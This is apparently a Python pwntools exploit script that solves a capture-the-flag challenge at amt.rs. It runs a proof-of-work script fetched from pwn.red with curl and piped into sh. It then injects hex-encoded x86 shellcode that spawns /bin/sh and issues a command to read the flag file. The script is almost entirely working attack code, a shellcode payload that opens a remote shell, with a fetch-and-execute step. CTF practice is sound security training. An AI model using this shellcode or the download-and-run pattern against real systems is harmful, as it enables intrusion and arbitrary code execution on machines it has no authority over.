#!/usr/bin/env python3
from pwn import *
import subprocess
import re

payload = "b85570330180008d40800040682f736800682f62696e89e3b80b000000b900000000ba00000000e9240000004048404840484048404840484048404840484048404840484048404840484048404840484040ebfe"

print("[*] Connecting to amt.rs:57207...")
io = remote('amt.rs', 57207)

# Handle proof of work
print("[*] Waiting for PoW challenge...")
pow_line = io.recvline().decode()
print(f"[+] Got: {pow_line.strip()}")

if "proof of work" in pow_line:
    curl_cmd_line = io.recvline().decode()
    print(f"[+] Command: {curl_cmd_line.strip()}")

    # Extract the challenge
    match = re.search(r's\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+', curl_cmd_line)
    if match:
        challenge = match.group(0)
        print(f"[+] Challenge: {challenge}")

        # Try to solve it using the script
        try:
            result = subprocess.run(
                ['curl', '-sSfL', 'https://pwn.red/pow'],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                pow_script = result.stdout
                # Execute the script with the challenge
                solve_result = subprocess.run(
                    ['sh', '-s', challenge],
                    input=pow_script,
                    capture_output=True,
                    text=True,
                    timeout=30
                )

                if solve_result.returncode == 0:
                    solution = solve_result.stdout.strip()
                    print(f"[+] Solution: {solution}")

                    io.send(solution.encode() + b'\n')
                else:
                    print(f"[-] PoW solve failed: {solve_result.stderr}")
                    exit(1)
            else:
                print("[-] Failed to download PoW script")
                print("[ ] Trying manual input...")
                io.interactive()
                exit(1)
        except Exception as e:
            print(f"[-] PoW error: {e}")
            print("[*] Switching to manual mode...")
            io.interactive()
            exit(1)

# Now we should be past PoW
print("[*] PoW solved, waiting for shellcode prompt...")
io.sendlineafter(b'shellcode: ', payload.encode())

print("[*] Shell should be spawned. Sending commands...")
sleep(1)

io.sendline(b'cat /srv/app/flag')
io.sendline(b'echo "=== FLAG ABOVE ==="')

try:
    output = io.recvuntil(b'=== FLAG ABOVE ===', timeout=5)
    print("\n" + "="*60)
    print("FLAG OUTPUT:")
    print("="*60)
    print(output.decode(errors='ignore'))
    print("="*60)
except:
    print("[-] Timeout or error. Trying to get any output...")
    try:
        print(io.recv(timeout=2).decode(errors='ignore'))
    except:
        pass

print("\n[*] Switching to interactive mode...")
io.interactive()
